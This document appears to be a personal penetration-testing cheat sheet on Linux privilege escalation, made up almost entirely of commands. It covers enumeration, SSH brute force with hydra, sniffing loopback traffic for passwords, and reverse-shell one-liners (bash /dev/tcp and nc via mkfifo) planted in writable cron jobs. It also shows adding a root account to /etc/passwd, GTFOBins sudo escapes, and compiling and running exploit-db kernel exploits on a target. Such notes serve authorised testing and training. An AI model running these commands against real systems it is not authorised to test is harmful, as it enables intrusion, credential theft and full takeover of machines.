# Linux Privilege Escalation

## Manual enumeration

Commands:
- `id`
- `cat /etc/passwd`
- `hostname`
- `cat /etc/issue`
- `cat /etc/os-realease`
- `uname -a`
- `ps aux`
- `ip a`
- `routel`
- `ss -anp`
- `cat /etc/iptables/rules.v4`
- `ls -lah /etc/cron*`
- `crontab -l`
- `sudo crontab -l`
- `dpkg -l`
- `find / -writable -type d 2> /dev/null`
- `cat /etc/fstab`
- `mount`
- `lsblk`
- `lsmod`
- `/sbin/modinfo some_kernel_module`
- `find / -perm -u=s -type f 2> /dev/null`

## Automated enumeration

Initial baseline:
```
/usr/bin/unix-privesc-check
```
Check for example writable config files.

Other tools:
- LinEnum: https://github.com/rebootuser/LinEnum
- LinPeas: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

## Credentials

### Hidden in text files

Check:
- `env`
- `cat .bashrc`
- `su - root`
- `sudo -l`

### Brute force ssh with password hints

With a hint of password:
```
crunch 19 19 -t Hint_Of_Password%%% > wordlist
hydra -l user -P wordlist $VictimIP -t 4 ssh -V
```

### Hidden passwords in Services

```
watch -n1 "ps aux | grep pass | grep -v grep | fold -s
sudo tcpdump -i lo -A | grep "pass"
```

## Cron jobs

If the cron job is writeable, add a reverse shell:
```
bash -i >& /dev/tcp/$AttackerIp/$AttackerPort 0>&1
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc $AttackerIp $AttackerPort > /tmp/f
```
Rshells: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Passwd file

```
openssl passwd passwordtohash
echo "newadmin:somehashstring:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## Capabilities

References:
- https://man7.org/linux/man-pages/man7/capabilities.7.html
- https://gtfobins.github.io/
```
/usr/sbin/getcap -r / 2> /dev/null
```

## SUID

Source: https://gtfobins.github.io/
```
find / -perm /6000 -exec ls -ld {} \; # setuid + setgid
grep Uid /proc/some_proc_number/status
ls -asl /usr/bin/some_binary
```

## Sudo

Check the commands usable with `sudo`:
```
sudo -l
```
then try to elevate privileges with them with [GTFObins](https://gtfobins.github.io/). For example:
- `tcpdump`: https://gtfobins.github.io/gtfobins/tcpdump/#sudo
```
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
```
Check possible error messages in `/etc/var/messages`.
- `apt-get`: https://gtfobins.github.io/gtfobins/apt-get/#sudo
```
hackeduser@hackedtarget $: sudo apt-get changelog apt
```
and in `less`:
```
!/bin/sh
```
Check the escalation with the `id` command.

## Kernel vulnerabilities

Retrieve the kernel version and try to find an exploit on [exploitdb](https://www.exploit-db.com/):
- kernel version:
```
cat /etc/issue
uname -r
arch
```
- `searchsploit` command:
```
searchsploit -u
searchsploit "Linux kernel x.y.z privilege escalation" | grep -v ' < a.b.c'
```
- run the exploit:
```
cp /usr/share/exploitdb/exploits/linux/local/exploin_number.c ./num.c
gcc num.c
scp a.out hackeduser@TargetIp:
./a.out
```
Check with the `id` command.

## Misc


